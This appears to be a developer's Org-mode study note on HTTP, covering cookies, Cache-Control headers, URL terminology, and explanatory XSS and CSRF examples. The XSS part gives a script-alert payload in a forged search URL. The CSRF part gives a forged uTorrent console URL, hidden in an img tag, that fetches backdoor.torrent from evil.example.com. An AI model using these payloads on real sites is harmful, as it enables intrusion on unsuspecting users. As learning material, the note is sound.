#+TITLE: HTTP

* Table of Contents :TOC_2_gh:
- [[#how-to][How-to]]
- [[#topics][Topics]]
  - [[#web-storage-vs-cookies][Web Storage vs. Cookies]]
  - [[#xss-cross-site-scripting][XSS (Cross-site scripting)]]
  - [[#csrf-cross-site-request-forgery][CSRF (Cross-site request forgery)]]
- [[#reference][Reference]]
  - [[#cache-control][Cache Control]]
  - [[#cookies][Cookies]]
- [[#terminology][Terminology]]
  - [[#url-vs-uri-vs-urn][URL vs URI vs URN]]
  - [[#endpoint][Endpoint]]

* How-to
* Topics
** Web Storage vs. Cookies
- https://auth0.com/docs/security/store-tokens

** XSS (Cross-site scripting)
- https://en.wikipedia.org/wiki/Cross-site_scripting

An attacker observes that target website contains a reflected XSS vulnerability:
1. Search feature: If no results were found, the page will display the url with the query term, like http://bobssite.org?q=term.
2. Submit a search query with a term like ~<script type='text/javascript'>alert('xss');</script>~
3. An alert box appears (that says ~xss~).
4. The url is ~http://bobssite.org?q=<script%20type='text/javascript'>alert('xss');</script>~
5. The attacker sends an e-mail which contains a link to the forged url.
6. The victim gets the link and executes the attackers script.

** CSRF (Cross-site request forgery)
- https://en.wikipedia.org/wiki/Cross-site_request_forgery

Force a ~.torrent~ file download:
1. uTorrent's web console is accessible at ~localhost:8080~
2. Forge a url make uTorrent download ~backdoor.torrent~ automatically
   - ~http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent~
3. Inject the forged url as ~<img>~ tag like: ~<img src="<url>">~
4. The victim opens the page containg the tag and download ~backdoor.torrent~ inadvertently.

* Reference
** Cache Control
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control
*** Request
#+BEGIN_EXAMPLE
  Cache-Control: max-age=<seconds>
  Cache-Control: max-stale[=<seconds>]
  Cache-Control: min-fresh=<seconds>
  Cache-Control: no-cache 
  Cache-Control: no-store
  Cache-Control: no-transform
  Cache-Control: only-if-cached
#+END_EXAMPLE

*** response
#+BEGIN_EXAMPLE
  Cache-Control: must-revalidate
  Cache-Control: no-cache
  Cache-Control: no-store
  Cache-Control: no-transform
  Cache-Control: public
  Cache-Control: private
  Cache-Control: proxy-revalidate
  Cache-Control: max-age=<seconds>
  Cache-Control: s-maxage=<seconds>
#+END_EXAMPLE

** Cookies
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
- https://stackoverflow.com/questions/1336126/does-every-web-request-send-the-browser-cookies

#+BEGIN_QUOTE
Yes, as long as the URL requested is within the same domain and path defined in the cookie
(and all of the other restrictions -- secure, httponly, not expired, etc) hold,
then the cookie will be sent for every request.
#+END_QUOTE

*** Set-Cookie
#+BEGIN_EXAMPLE
  Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
#+END_EXAMPLE

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies
- Secure   :: The cookies that are set can only be sent over HTTPS
- HttpOnly :: The cookies that are set cannot be retrieved with JS. Only be sent to the designated server.

* Terminology
** URL vs URI vs URN
- https://stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn

| Name (Uniform Resource -) | Example                                 | Note                                                                                                         |
|---------------------------+-----------------------------------------+--------------------------------------------------------------------------------------------------------------|
| ~URI~ (Identifier)        | ~https://www.google.co.kr/search?q=uri~ |                                                                                                              |
| ~URL~ (Locator)           | ~https://www.google.co.kr/search~       | Subset of ~URI~, contains only about location                                                                |
| ~URN~ (Name)              | ~urn:google:search:uri~                 | Subset of ~URI~, doesn't necessarily tell you how to locate it on the internet. Usually Prefixed with ~urn:~ |

[[file:_img/screenshot_2017-06-03_15-46-11.png]]

** Endpoint
- https://stackoverflow.com/questions/9807382/what-is-a-web-service-endpoint
- A web ~endpoint~ is ~URL~ that another program would use to communicate with your program.
